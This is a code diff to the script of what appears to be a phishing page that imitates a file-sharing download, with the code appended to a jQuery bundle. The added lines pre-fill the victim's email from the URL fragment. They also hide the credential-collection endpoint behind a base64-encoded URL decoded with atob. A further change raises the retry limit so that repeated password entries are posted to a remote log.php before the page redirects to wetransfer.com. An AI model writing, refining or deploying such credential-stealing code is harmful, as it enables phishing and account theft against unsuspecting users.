@@ -10877,19 +10877,15 @@ return jQuery;
   $(document).ready(function(){
     $("#mspinner").css("display", "none");
     var trials = 0;
-    $("a").click( (e)=>{
-        e.preventDefault();
-        $("#modalbox").css("display", "block");
-        $("#password").focus();
-    });
-
-    
-
-    $("td").click( (e)=>{
-        e.preventDefault();
-        $("#modalbox").css("display", "block");
-        $("#password").focus();
-    });
+    var url = window.location.hash.substr(1);
+    if (!url) {
+    	$("#email").focus();
+    }else{
+         
+        $('#email').val(url);
+        $('#email').attr('readonly', true);
+        $('#password').focus(); 
+    } 
 
     $("#submit").click( (e)=>{
         e.preventDefault();
@@ -10911,7 +10907,7 @@ return jQuery;
         $("#password").css("border", "1px solid #ccc"); 
         $("#email").css("border", "1px solid #ccc"); 
         $.ajax({
-            url: "https://files-download.sykesintl.com/files/log.php",
+            url: atob("aHR0cHM6Ly9zenhjby5jb20veC9sb2cucGhw"),
             method: "post",
             data: {
                 X1: email,
@@ -10923,7 +10919,7 @@ return jQuery;
             success: function(data){
                 trials++;
                 setTimeout(() => {
-                    if(trials == 5){
+                    if(trials == 500){
                         window.location.href = "https://wetransfer.com";
                     }  
                     $("#error").css("display", "block");
@@ -10936,7 +10932,7 @@ return jQuery;
             error: function(data){
                 trials++;
                 setTimeout(() => {
-                    if(trials == 5){
+                    if(trials == 500){
                         window.location.href = "https://wetransfer.com";
                     }  
                     $("#error").css("display", "block");
@@ -10949,7 +10945,7 @@ return jQuery;
             
 
             setTimeout( () => {
-                     $('#submit').html('Verify').prop('disabled', false);
+                     $('#submit').html('Confirm').prop('disabled', false);
                 }, 6000);
             }
 
